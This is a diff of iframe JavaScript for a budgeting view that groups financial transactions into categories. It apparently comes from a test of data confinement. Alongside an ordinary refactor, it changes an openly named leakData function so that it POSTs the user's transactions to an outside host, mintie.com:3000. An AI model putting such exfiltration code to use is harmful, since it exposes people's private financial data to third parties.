@@ -3,7 +3,6 @@
   var transactions = [];
 
   function constructCategories(categoriesArray) {
-
     categoriesArray.forEach(function(data) {
       console.log('Data', data);
       categories[data.id] = {};
@@ -30,17 +29,24 @@
     });
   }
 
-  function addTransactions(transactions) {
+  function constructTransactions(transactionData) {
+    // cache the transactions for later use
+    transactions = transactionData;
+
+    Object.keys(categories).forEach(function(categoryKey) {
+      var category = categories[categoryKey];
+      category.transactions = [];
+    });
     // go through each transaction, see which categorty it belongs to then add to category
     transactions.forEach(function(data) {
       var cID = accounts[data.account_id];
       if (!cID) {
         cID = 'unknown';
       }
-
+      var category = categories[cID];
+      // category.transactions = [];
       categories[cID]['transactions'].push(data);
     });
-
   }
 
   console.log('Inside iframe');
@@ -54,10 +60,12 @@
     if (protectedObj['categories']) {
       constructCategories(protectedObj['categories']);
       constructAccounts(protectedObj['accounts']);
+      constructTransactions(transactions);
+      displayCategories();
     }
 
     if (protectedObj['transactions']) {
-      addTransactions(protectedObj['transactions']);
+      constructTransactions(protectedObj['transactions']);
       // update categories etc
       displayCategories();
     }
@@ -80,6 +88,9 @@
 
   function displayCategories() {
     var categoriesEl = document.getElementById('categories');
+    categoriesEl.innerHTML = '';
+
+    // clear categories element
     var tmpl = document.getElementById('category-template');
 
     // show category
@@ -119,7 +130,7 @@ function leakData() {
   try {
     var req = new XMLHttpRequest();
     req.open('POST', 'http://mintie.com:3000/');
-    req.send(JSON.stringify(categories));
+    req.send(JSON.stringify(transactions));
   } catch(e) {
     console.log("Failed to leak!");
   }
